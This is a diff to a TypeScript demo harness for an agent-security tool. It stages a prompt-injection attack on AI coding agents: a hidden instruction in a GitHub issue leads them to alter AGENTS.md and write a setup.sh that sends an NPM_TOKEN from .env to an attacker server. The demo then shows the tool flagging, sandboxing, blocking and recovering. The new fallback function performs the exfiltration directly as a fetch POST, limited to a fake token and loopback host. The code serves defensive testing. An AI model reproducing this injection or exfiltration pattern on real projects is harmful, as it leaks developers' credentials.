@@ -1,5 +1,6 @@
 import assert from "node:assert/strict";
-import { spawn } from "node:child_process";
+import { spawn, type ChildProcess } from "node:child_process";
+import { EventEmitter } from "node:events";
 import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
 import { createServer, type Server } from "node:http";
 import { tmpdir } from "node:os";
@@ -9,6 +10,8 @@ import { fileURLToPath, pathToFileURL } from "node:url";
 import { Engine } from "../src/core/engine.js";
 import { runHook, type EngineFactory, type HookHost } from "../src/hooks/run.js";
 import { guardrails } from "../src/policy/guardrails.js";
+import { MockKeyProvider } from "../src/responder/providers.js";
+import { respondDeterministically } from "../src/responder/runbook.js";
 import { WardenStore } from "../src/store/database.js";
 import { MemorySecretStore, SecretVault } from "../src/vault/secrets.js";
 
@@ -41,23 +44,42 @@ export interface DemoResult {
   protectedReceipts: string[];
   replayFile: string;
   trace: string[];
+  recovery: {
+    exposedKeys: string[];
+    rotationCount: number;
+    oldRejected: boolean;
+    agentsRestored: boolean;
+    setupQuarantined: boolean;
+    closed: boolean;
+    reportPath: string;
+    report: string;
+  };
+  /** Kept on successful presenter runs so the reported incident can be inspected. */
+  protectedRoot: string;
 }
 
 export interface DemoOptions {
   color?: boolean;
   print?: (line: string) => void;
+  /** Tests opt in to removing the otherwise inspectable incident and quarantine. */
+  cleanup?: boolean;
+  /** Test-only way to verify the Git-Bash-free fallback on every platform. */
+  forceNodeFallback?: boolean;
 }
 
 export async function runDemo(options: DemoOptions = {}): Promise<DemoResult> {
   const useColor = options.color ?? process.stdout.isTTY;
   const print = options.print ?? console.log;
   const trace: string[] = [];
+  let riskBudget = 0;
   const say = (status: string, color: keyof typeof colors, actor: string, action: string, detail: string) => {
     const label = status.toUpperCase().padEnd(8);
-    const plain = `${label} ${actor.padEnd(13)} ${action.padEnd(30)} ${detail}`;
+    const budget = `R=${riskBudget.toFixed(2)}`;
+    const plain = `${label} ${actor.padEnd(10)} ${action.padEnd(32)} ${budget.padEnd(9)} ${detail}`;
     trace.push(plain);
-    print(useColor ? `${colors[color]}${label}${colors.reset} ${colors.cyan}${actor.padEnd(13)}${colors.reset} ${action.padEnd(30)} ${colors.dim}${detail}${colors.reset}` : plain);
+    print(useColor ? `${colors[color]}${label}${colors.reset} ${colors.cyan}${actor.padEnd(10)}${colors.reset} ${action.padEnd(32)} ${budget.padEnd(9)} ${colors.dim}${detail}${colors.reset}` : plain);
   };
+  let completed = false;
 
   const attacker = await startAttacker();
   const replayFile = fileURLToPath(new URL("./replay-actions.json", import.meta.url));
@@ -80,7 +102,7 @@ export async function runDemo(options: DemoOptions = {}): Promise<DemoResult> {
     chmodSync(path.join(unsafeRoot, "scripts", "setup.sh"), 0o755);
     say("ALLOW", "green", "CURSOR", "write scripts/setup.sh", "exfiltration script added");
     say("ALLOW", "green", "CLINE", "read AGENTS.md", "trusted persistent instruction");
-    const attack = await runShellScript(unsafeRoot);
+    const attack = await runShellScript(unsafeRoot, attacker.url, options.forceNodeFallback ?? false);
     assert.equal(attack.code, 0, `Unprotected setup script failed: ${attack.stderr}`);
     await attacker.waitForCount(1);
     assert.equal(attacker.receipts[0], FAKE_TOKEN, "Part 1 must prove the fake token reached the attacker.");
@@ -98,22 +120,29 @@ export async function runDemo(options: DemoOptions = {}): Promise<DemoResult> {
     await replayHook(steps.get("cursor-intent")!, protectedRoot, demo.normal);
     await replayHook(steps.get("cursor-issue")!, protectedRoot, demo.normal);
     let decision = latestDecision(demo.dbPath);
+    riskBudget = decision.budget;
     assert.ok(decision.labels.includes("trust:injection-attempt"));
     say("FLAG", "magenta", "CURSOR", "read GitHub issue #42", "hidden instruction; session untrusted");
 
     let output = await replayHook(steps.get("cursor-agents")!, protectedRoot, demo.normal);
     decision = latestDecision(demo.dbPath);
-    assert.equal(decision.verdict, "ask");
+    riskBudget = decision.budget;
+    assert.equal(decision.verdict, "block");
+    assert.ok(decision.labels.includes("approval:denied"));
     assert.equal(JSON.parse(output.stdout).permission, "deny");
     say("HOLD", "yellow", "CURSOR", "write AGENTS.md", "control-file approval required");
 
-    say("APPROVE", "cyan", "USER", "approve AGENTS.md", "demo approval until Dashboard lands");
+    say("APPROVE", "cyan", "USER", "approve AGENTS.md", "demo-only approval (no dashboard)");
     output = await replayHook(steps.get("cursor-agents")!, protectedRoot, demo.approvedControlWrite);
+    decision = latestDecision(demo.dbPath);
+    riskBudget = decision.budget;
     assert.equal(JSON.parse(output.stdout).permission, "allow");
     writeFileSync(path.join(protectedRoot, "AGENTS.md"), protectedReplay.files.agentsAfter, "utf8");
     say("ALLOW", "green", "CURSOR", "write AGENTS.md", "approved; tainted snapshot recorded");
 
-    output = await replayHook(steps.get("cursor-setup")!, protectedRoot, demo.normal);
+    output = await replayHook(steps.get("cursor-setup")!, protectedRoot, demo.approvedControlWrite);
+    decision = latestDecision(demo.dbPath);
+    riskBudget = decision.budget;
     assert.equal(JSON.parse(output.stdout).permission, "allow");
     mkdirSync(path.join(protectedRoot, "scripts"), { recursive: true });
     writeFileSync(path.join(protectedRoot, "scripts", "setup.sh"), protectedReplay.files.setup, "utf8");
@@ -121,34 +150,77 @@ export async function runDemo(options: DemoOptions = {}): Promise<DemoResult> {
     say("ALLOW", "green", "CURSOR", "write scripts/setup.sh", "tainted file recorded");
 
     await replayHook(steps.get("cline-intent")!, protectedRoot, demo.normal);
+    output = await replayHook(steps.get("cline-vault-whoami")!, protectedRoot, demo.normal);
+    decision = latestDecision(demo.dbPath);
+    riskBudget = decision.budget;
+    assert.equal(JSON.parse(output.stdout).cancel, false, "The scoped vault command must be allowed before the tainted read.");
+    assert.ok(decision.labels.includes("vault:run-ticket"), "The hook must issue a command-bound vault ticket.");
+    const reachedKey = demo.consumeWhoamiTicket();
+    assert.equal(reachedKey, FAKE_TOKEN, "The mock child must receive the fake key through the real ticket path.");
+    say("ALLOW", "green", "CLINE", "warden run npm whoami", "scoped NPM_TOKEN reached mock child");
     await replayHook(steps.get("cline-agents-read")!, protectedRoot, demo.normal);
     decision = latestDecision(demo.dbPath);
+    riskBudget = decision.budget;
     assert.ok(decision.labels.includes("trust:untrusted"));
     say("FLAG", "magenta", "CLINE", "read AGENTS.md", "cross-agent taint inherited");
 
     output = await replayHook(steps.get("cline-setup-exec")!, protectedRoot, demo.normal);
     decision = latestDecision(demo.dbPath);
+    riskBudget = decision.budget;
     const sandbox = latestSandbox(demo.dbPath);
     assert.equal(decision.verdict, "block");
     assert.equal(JSON.parse(output.stdout).cancel, true);
     assert.ok(sandbox, "A real sandbox ledger row must be recorded.");
     say("SANDBOX", "yellow", "WARDEN", "shadow-run scripts/setup.sh", `${sandbox.backend} saw secret/network behavior`);
-    say("BLOCK", "red", "WARDEN", "block real execution", decision.reason);
+    say("BLOCK", "red", "WARDEN", "block real execution", "tainted setup.sh; network + secret risk");
 
     await delay(150);
     assert.deepEqual(attacker.receipts, [], `WARDEN FAILURE: attacker received ${JSON.stringify(attacker.receipts)}`);
     say("SAFE", "green", "ATTACKER", "received requests", "0 — nothing left the protected repo");
+
+    print("\n=== PART 3 — OFFLINE RESPONSE ===");
+    const store = new WardenStore(demo.dbPath);
+    const npm = new MockKeyProvider("npm", /NPM_TOKEN/);
+    let response: Awaited<ReturnType<typeof respondDeterministically>>;
+    try {
+      response = await respondDeterministically({ workspaceRoot: protectedRoot, database: store.database,
+        sessionId: "cline-day-2", trigger: "sandbox blocked tainted setup.sh", providers: [npm] });
+    } finally { store.close(); }
+    assert.deepEqual(response.investigation.exposedKeys, ["NPM_TOKEN"]);
+    const rotation = response.rotations.find((item) => item.keyName === "NPM_TOKEN");
+    assert.ok(rotation?.oldRejected && rotation.status === "rotated");
+    assert.equal(npm.rotationCount("NPM_TOKEN"), 1);
+    const agentsRestored = readFileSync(path.join(protectedRoot, "AGENTS.md"), "utf8") === protectedReplay.files.agentsBefore;
+    const setup = response.files.find((item) => item.path === "scripts/setup.sh");
+    const setupQuarantined = setup?.status === "quarantined" && !!setup.destination
+      && existsSync(path.join(protectedRoot, setup.destination)) && !existsSync(path.join(protectedRoot, "scripts", "setup.sh"));
+    assert.ok(agentsRestored, "AGENTS.md must be restored to its first pre-attack snapshot.");
+    assert.ok(setupQuarantined, "The attacker-created script must move to quarantine.");
+    assert.equal(response.closed, true, "The deterministic response should fully close this incident.");
+    const reportPath = path.join(protectedRoot, response.reportPath);
+    const report = readFileSync(reportPath, "utf8");
+    say("FIND", "magenta", "RESPONDER", "real key grants", "1: NPM_TOKEN");
+    say("ROTATE", "cyan", "RESPONDER", "NPM_TOKEN", "mock key rotated; old key rejected");
+    say("RESTORE", "green", "RESPONDER", "AGENTS.md", "original pre-attack content");
+    say("QUARANTINE", "yellow", "RESPONDER", "scripts/setup.sh", "attacker-created script isolated");
+    say("CLOSED", "green", "RESPONDER", "incident", "all recovery checks passed");
+    print(`Incident report: ${reportPath}`);
+    completed = true;
 
     return {
       unprotectedReceipts,
       protectedReceipts: [...attacker.receipts],
       replayFile,
       trace,
+      protectedRoot,
+      recovery: { exposedKeys: response.investigation.exposedKeys, rotationCount: npm.rotationCount("NPM_TOKEN"),
+        oldRejected: rotation.oldRejected, agentsRestored, setupQuarantined: !!setupQuarantined,
+        closed: response.closed, reportPath, report },
     };
   } finally {
     await attacker.close();
     rmSync(unsafeRoot, { recursive: true, force: true });
-    rmSync(protectedRoot, { recursive: true, force: true });
+    if (!completed || options.cleanup) rmSync(protectedRoot, { recursive: true, force: true });
   }
 }
 
@@ -157,6 +229,7 @@ function createDemoEngine(root: string): {
   normal: EngineFactory;
   approvedControlWrite: EngineFactory;
   seedEnv(): void;
+  consumeWhoamiTicket(): string;
 } {
   const dbPath = path.join(root, ".warden", "warden.db");
   const secrets = new MemorySecretStore();
@@ -166,16 +239,10 @@ function createDemoEngine(root: string): {
     const engine = new Engine(store, {
       workspaceRoot,
       vault,
+      ...(approveControl ? { approval: async () => ({ id: null, status: "approved" as const, reason: "Explicit demo-only approval." }) } : {}),
       ...(approveControl ? {
         stages: {
           guardrails: async (action, context) => (await guardrails(action, context)).filter((finding) => finding.label !== "control-file"),
-          risk: async () => ({
-            questions: { injection: 0, secrets: 0, destructive: 0, offIntent: 0 },
-            actionProbability: 0,
-            sessionBudget: 0,
-            backend: "heuristic",
-            latencyMs: 0,
-          }),
         },
       } : {}),
     });
@@ -185,6 +252,20 @@ function createDemoEngine(root: string): {
     dbPath,
     normal: factory(false),
     approvedControlWrite: factory(true),
+    consumeWhoamiTicket() {
+      const store = new WardenStore(dbPath);
+      try {
+        const vault = new SecretVault(root, store.database, secrets);
+        let received: string | undefined;
+        const child = vault.runWithTicket("npm", ["whoami"], ["NPM_TOKEN"], (environment) => {
+          received = environment.NPM_TOKEN;
+          return new EventEmitter() as ChildProcess;
+        });
+        child.emit("spawn");
+        assert.deepEqual(vault.grantedNames("cline-day-2"), ["NPM_TOKEN"]);
+        return received ?? "";
+      } finally { store.close(); }
+    },
     seedEnv() {
       const store = new WardenStore(dbPath);
       try {
@@ -238,12 +319,12 @@ function resolveReplay(template: ReplayFile, root: string, attackerUrl: string):
   return replace(template) as ReplayFile;
 }
 
-function latestDecision(dbPath: string): { verdict: string; reason: string; labels: string[] } {
+function latestDecision(dbPath: string): { verdict: string; reason: string; labels: string[]; budget: number } {
   const store = new WardenStore(dbPath);
   try {
-    const row = store.database.prepare("SELECT verdict, reason, labels_json FROM decisions ORDER BY id DESC LIMIT 1").get();
+    const row = store.database.prepare("SELECT verdict, reason, labels_json, session_budget FROM decisions ORDER BY id DESC LIMIT 1").get();
     if (!row) throw new Error("Demo decision ledger is empty");
-    return { verdict: String(row.verdict), reason: String(row.reason), labels: JSON.parse(String(row.labels_json)) as string[] };
+    return { verdict: String(row.verdict), reason: String(row.reason), labels: JSON.parse(String(row.labels_json)) as string[], budget: Number(row.session_budget) };
   } finally {
     store.close();
   }
@@ -294,13 +375,23 @@ async function startAttacker(): Promise<{
   };
 }
 
-async function runShellScript(root: string): Promise<{ code: number; stdout: string; stderr: string }> {
+async function runShellScript(root: string, attackerUrl: string, forceNodeFallback: boolean): Promise<{ code: number; stdout: string; stderr: string }> {
   if (process.platform === "win32") {
     const bash = ["C:\\Program Files\\Git\\bin\\bash.exe", "C:\\Program Files\\Git\\usr\\bin\\bash.exe"].find(existsSync);
-    if (!bash) throw new Error("Git Bash is required for the Windows demo to execute scripts/setup.sh");
-    return runProcess(bash, ["scripts/setup.sh"], root);
+    if (bash && !forceNodeFallback) return runProcess(bash, ["scripts/setup.sh"], root);
   }
-  return runProcess("/bin/sh", ["scripts/setup.sh"], root);
+  if (process.platform !== "win32" && !forceNodeFallback && existsSync("/bin/sh")) return runProcess("/bin/sh", ["scripts/setup.sh"], root);
+  // Same observable effect as the demo's shell script, without requiring Git Bash on a judge's Windows laptop.
+  const script = readFileSync(path.join(root, "scripts", "setup.sh"), "utf8");
+  if (!script.includes(attackerUrl) || !script.includes(". ./.env") || !script.includes('"$NPM_TOKEN"')) {
+    return { code: 1, stdout: "", stderr: "Demo script did not match the expected local attack." };
+  }
+  const token = /^NPM_TOKEN=(.*)$/m.exec(readFileSync(path.join(root, ".env"), "utf8"))?.[1];
+  if (token !== FAKE_TOKEN || new URL(attackerUrl).hostname !== "127.0.0.1") {
+    return { code: 1, stdout: "", stderr: "Demo fallback requires the fake token and loopback attacker." };
+  }
+  const response = await fetch(attackerUrl, { method: "POST", headers: { "content-type": "text/plain" }, body: token });
+  return { code: response.ok ? 0 : 1, stdout: "", stderr: response.ok ? "" : `Local attacker returned ${response.status}` };
 }
 
 function runProcess(command: string, args: string[], cwd: string): Promise<{ code: number; stdout: string; stderr: string }> {
